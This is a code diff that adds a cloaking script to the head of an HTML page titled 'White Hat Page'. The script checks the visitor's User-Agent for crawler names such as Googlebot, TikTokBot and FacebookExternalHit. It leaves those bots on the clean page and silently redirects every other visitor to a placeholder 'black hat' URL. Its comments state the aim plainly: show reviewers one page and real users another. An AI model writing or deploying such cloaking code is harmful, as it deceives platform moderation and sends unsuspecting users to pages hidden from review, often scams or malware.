@@ -1,6 +1,20 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+    <script>
+    // Define common bot User-Agents
+    const botAgents = ["TikTokBot", "Googlebot", "FacebookExternalHit"];
+    const userAgent = navigator.userAgent;
+
+    // Check if the User-Agent is from a bot
+    if (botAgents.some(bot => userAgent.includes(bot))) {
+        console.log("Bot detected: Staying on WH page.");
+    } else {
+        // Redirect real users to the BH page
+        window.location.href = "https://your-bh-page.com";
+    }
+</script>
+
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>White Hat Page</title>
